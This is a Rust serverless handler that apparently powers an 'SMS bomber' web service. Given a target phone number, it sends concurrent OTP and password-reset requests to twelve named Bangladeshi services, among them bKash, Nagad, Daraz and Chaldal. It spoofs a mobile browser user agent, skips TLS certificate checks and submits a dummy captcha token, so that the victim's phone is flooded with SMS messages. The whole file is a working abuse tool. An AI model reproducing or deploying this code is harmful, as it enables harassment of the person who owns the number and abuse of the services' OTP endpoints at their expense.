use vercel_runtime::{run, Body, Error, Request, Response, StatusCode};
use reqwest::{Client, header::{HeaderMap, HeaderValue, CONTENT_TYPE, USER_AGENT}};
use serde::Deserialize;
use serde_json::{json, Value};
use std::time::Duration;
use futures::future::join_all;

// ── SECRET TOKEN ──
const SECRET_TOKEN: &str = "DCM_DARK_CYBER_2026";

// ── ALLOWED ORIGINS ──
const ALLOWED_ORIGINS: &[&str] = &[
    "https://sms-bomber-it.vercel.app",
    "https://customsms-it.vercel.app",
    "https://smsbomber.introvertboytushar.workers.dev",
];

// ── API Structure ──
struct SmsApi {
    name:         &'static str,
    url:          &'static str,
    method:       &'static str,
    body_builder: fn(&str) -> Value,
}

#[derive(Deserialize)]
struct BombRequest {
    number: String,
}

// ── Origin check helper ──
fn get_allowed_origin(req: &Request) -> &'static str {
    let origin = req.headers()
        .get("origin")
        .or_else(|| req.headers().get("referer"))
        .and_then(|v| v.to_str().ok())
        .unwrap_or("");

    ALLOWED_ORIGINS
        .iter()
        .find(|&&o| origin.starts_with(o))
        .copied()
        .unwrap_or("null")
}

#[tokio::main]
async fn main() -> Result<(), Error> {
    run(handler).await
}

pub async fn handler(req: Request) -> Result<Response<Body>, Error> {

    let allowed_origin = get_allowed_origin(&req);

    // ── CORS preflight ──
    if req.method() == "OPTIONS" {
        return Ok(Response::builder()
            .status(StatusCode::OK)
            .header("Access-Control-Allow-Origin", allowed_origin)
            .header("Access-Control-Allow-Methods", "POST, GET, OPTIONS")
            .header("Access-Control-Allow-Headers", "Content-Type, x-auth-token, x-user-id")
            .header("Access-Control-Max-Age", "86400")
            .body("".into())?);
    }

    // ── Origin check ──
    if allowed_origin == "null" {
        return Ok(Response::builder()
            .status(StatusCode::FORBIDDEN)
            .header("Content-Type", "application/json")
            .header("Access-Control-Allow-Origin", "null")
            .body(json!({"error": "Access denied", "message": "Origin not allowed"})
                .to_string().into())?);
    }

    // ── GET: Token দাও ──
    if req.method() == "GET" {
        return Ok(Response::builder()
            .status(StatusCode::OK)
            .header("Content-Type", "application/json")
            .header("Access-Control-Allow-Origin", allowed_origin)
            .body(json!({"token": SECRET_TOKEN}).to_string().into())?);
    }

    // ── Auth check ──
    let auth = req.headers()
        .get("x-auth-token")
        .and_then(|v| v.to_str().ok())
        .unwrap_or("");

    if auth != SECRET_TOKEN {
        return Ok(Response::builder()
            .status(StatusCode::UNAUTHORIZED)
            .header("Content-Type", "application/json")
            .header("Access-Control-Allow-Origin", allowed_origin)
            .body(json!({"error": "Unauthorized", "message": "Invalid security token!"})
                .to_string().into())?);
    }

    // ── Method check ──
    if req.method() != "POST" {
        return Ok(Response::builder()
            .status(StatusCode::METHOD_NOT_ALLOWED)
            .header("Access-Control-Allow-Origin", allowed_origin)
            .body("POST Only".into())?);
    }

    // ── Parse body ──
    let body: BombRequest = match serde_json::from_slice(req.body()) {
        Ok(v) => v,
        Err(_) => return Ok(Response::builder()
            .status(StatusCode::BAD_REQUEST)
            .header("Access-Control-Allow-Origin", allowed_origin)
            .body("Invalid JSON".into())?),
    };

    let target = body.number.clone();

    // ── phone number helpers ──
    let bd_no   = target.trim_start_matches('0').to_string();
    let bd_full = format!("880{}", bd_no);
    let plus_bd = format!("+88{}", target);

    // ── Build client ──
    let client = Client::builder()
        .timeout(Duration::from_secs(9))
        .danger_accept_invalid_certs(true)
        .build()?;

    // ── API List ──
    let apis: Vec<SmsApi> = vec![
        SmsApi {
            name: "Shadhin Music",
            url: "https://coreapi.shadhinmusic.com/api/v5/otp/OtpRobiReq",
            method: "POST",
            body_builder: |p| {
                let n = p.trim_start_matches('0');
                json!({"msisdn": format!("880{}", n), "shortcode": 16235, "servicename": "Shadhin Music"})
            },
        },
        SmsApi {
            name: "Khaodao",
            url: "https://api.eat-z.com/auth/customer/app-connect",
            method: "POST",
            body_builder: |p| {
                let n = p.trim_start_matches('0');
                json!({"username": format!("+88{}", n)})
            },
        },
        SmsApi {
            name: "Walton Plaza",
            url: "https://waltonplaza.com.bd/api/auth/otp/create",
            method: "POST",
            body_builder: |p| {
                let n = p.trim_start_matches('0');
                json!({"auth": {"countryCode": "880", "phone": n}, "captchaToken": "recapcha"})
            },
        },
        SmsApi {
            name: "Easy.com.bd",
            url: "https://core.easy.com.bd/api/v1/forgot-password-otp",
            method: "POST",
            body_builder: |p| json!({"device_key": "2ea97d276a980993308116baa292cec9", "mobile": p}),
        },
        SmsApi {
            name: "Chaldal",
            url: "https://chaldal.com/api/OTP/GenerateOTP",
            method: "POST",
            body_builder: |p| json!({"phoneNumber": format!("+88{}", p)}),
        },
        SmsApi {
            name: "Shajgoj",
            url: "https://shajgoj.com/wp-json/cocart/v1/customer/otp",
            method: "POST",
            body_builder: |p| json!({"phone": p, "type": "login"}),
        },
        SmsApi {
            name: "Bkash",
            url: "https://www.bkash.com/api/get-otp",
            method: "POST",
            body_builder: |p| json!({"mobile": p}),
        },
        SmsApi {
            name: "Nagad",
            url: "https://api.mynagad.com/api/dfs/check-account",
            method: "POST",
            body_builder: |p| {
                let n = p.trim_start_matches('0');
                json!({"accountNumber": format!("880{}", n)})
            },
        },
        SmsApi {
            name: "Pathao Food",
            url: "https://pathao.com/api/v1/auth/otp",
            method: "POST",
            body_builder: |p| json!({"phone": p, "country_code": "+880"}),
        },
        SmsApi {
            name: "Shohoz",
            url: "https://shohoz.com/api/v4.0/user/sendOTP",
            method: "POST",
            body_builder: |p| json!({"mobile_no": p}),
        },
        SmsApi {
            name: "Daraz",
            url: "https://member.daraz.com.bd/user/api/v1/otp/sendOtp",
            method: "POST",
            body_builder: |p| {
                let n = p.trim_start_matches('0');
                json!({"mobile": format!("880{}", n), "countryCode": "880", "action": "REGISTER"})
            },
        },
        SmsApi {
            name: "Sheba.xyz",
            url: "https://sheba.xyz/api/v2/auth/otp",
            method: "POST",
            body_builder: |p| json!({"mobile": p}),
        },
    ];

    // ── Fire all concurrently ──
    let mut tasks = vec![];

    for api in apis {
        let c      = client.clone();
        let number = target.clone();

        let task = tokio::spawn(async move {
            let body_data = (api.body_builder)(&number);
            let mut h = HeaderMap::new();
            h.insert(CONTENT_TYPE, HeaderValue::from_static("application/json"));
            h.insert(USER_AGENT, HeaderValue::from_static(
                "Mozilla/5.0 (Linux; Android 12; SM-G991B) AppleWebKit/537.36 Chrome/112.0.0.0 Mobile Safari/537.36"
            ));
            h.insert("Accept",          HeaderValue::from_static("application/json, text/plain, */*"));
            h.insert("Accept-Language", HeaderValue::from_static("en-US,en;q=0.9"));

            let result = if api.method == "POST" {
                c.post(api.url).headers(h).json(&body_data).send().await
            } else {
                c.get(api.url).headers(h).send().await
            };

            match result {
                Ok(r)  => (api.name, r.status().as_u16(), true),
                Err(_) => (api.name, 0u16, false),
            }
        });

        tasks.push(task);
    }

    let results = join_all(tasks).await;

    let mut success = 0u32;
    let mut failed  = 0u32;
    let mut api_results: Vec<Value> = vec![];

    for r in results {
        if let Ok((name, status, ok)) = r {
            if ok && (status == 200 || status == 201 || status == 202) {
                success += 1;
            } else {
                failed += 1;
            }
            api_results.push(json!({
                "api":    name,
                "status": status,
                "ok":     ok && (status == 200 || status == 201 || status == 202)
            }));
        }
    }

    Ok(Response::builder()
        .status(StatusCode::OK)
        .header("Content-Type", "application/json")
        .header("Access-Control-Allow-Origin", allowed_origin)
        .body(json!({
            "status":   "executed",
            "target":   target,
            "success":  success,
            "failed":   failed,
            "total":    success + failed,
            "results":  api_results
        }).to_string().into())?)
}
